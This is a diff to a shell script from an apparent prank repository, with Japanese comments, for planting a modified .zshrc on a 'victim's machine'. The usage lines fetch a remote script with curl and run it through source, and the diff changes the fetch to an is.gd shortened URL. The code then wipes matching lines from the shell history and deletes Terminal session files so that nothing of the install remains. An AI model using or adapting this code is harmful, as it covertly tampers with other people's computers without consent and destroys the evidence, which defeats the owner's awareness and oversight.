@@ -1,6 +1,7 @@
 # 基地を持ち込まずに被害者のマシンへ直接適用する（cloneフォルダを残さない）。
 # 必ず source で現在のシェルに流し込む。先頭に空白を付けると履歴にも残らない:
-#   (先頭スペース) source <(curl -fsSL RAW_URL/train_remote.sh) virus.sed
+#   (先頭スペース) source <(curl -s RAW_URL/x)            # 引数なし=既定プランク
+#   (先頭スペース) source <(curl -s RAW_URL/x) virus_sl.sed  # プランク指定
 BASE="https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main"
 __virus="${1:-virus.sed}"
 __tmp="$(mktemp)"
@@ -21,14 +22,14 @@ rm -f "$__ref"
 
 # 履歴ファイルから導入の痕跡を消す（macOSには tac が無いので tail -r）
 if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
-  tail -r "$HISTFILE" | sed '1,20{/curl/d;/train_remote/d;/git/d;/clone/d;}' > "$HISTFILE.tmp"
+  tail -r "$HISTFILE" | sed '1,20{/curl/d;/is.gd/d;/git/d;/clone/d;}' > "$HISTFILE.tmp"
   [ -s "$HISTFILE.tmp" ] && tail -r "$HISTFILE.tmp" > "$HISTFILE"
   rm -f "$HISTFILE.tmp"
 fi
 
 # macOS Terminal.app のセッション履歴(~/.zsh_sessions)にも残るので掃除
 if [ -d ~/.zsh_sessions ]; then
-  grep -rl -e curl -e train_remote ~/.zsh_sessions 2>/dev/null | xargs rm -f 2>/dev/null
+  grep -rl -e curl -e is.gd ~/.zsh_sessions 2>/dev/null | xargs rm -f 2>/dev/null
 fi
 
 source ~/.zshrc
@@ -41,7 +42,7 @@ __prank_scrub() {
   emulate -L zsh
   fc -A 2>/dev/null   # メモリ上の履歴をファイルへ確定（環境差を吸収）
   if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
-    tail -r "$HISTFILE" 2>/dev/null | sed '1,25{/curl/d;/train_remote/d;/__prank_scrub/d;}' > "$HISTFILE.tmp" 2>/dev/null
+    tail -r "$HISTFILE" 2>/dev/null | sed '1,25{/curl/d;/is.gd/d;/__prank_scrub/d;}' > "$HISTFILE.tmp" 2>/dev/null
     [ -s "$HISTFILE.tmp" ] && tail -r "$HISTFILE.tmp" > "$HISTFILE" 2>/dev/null
     rm -f "$HISTFILE.tmp"
   fi
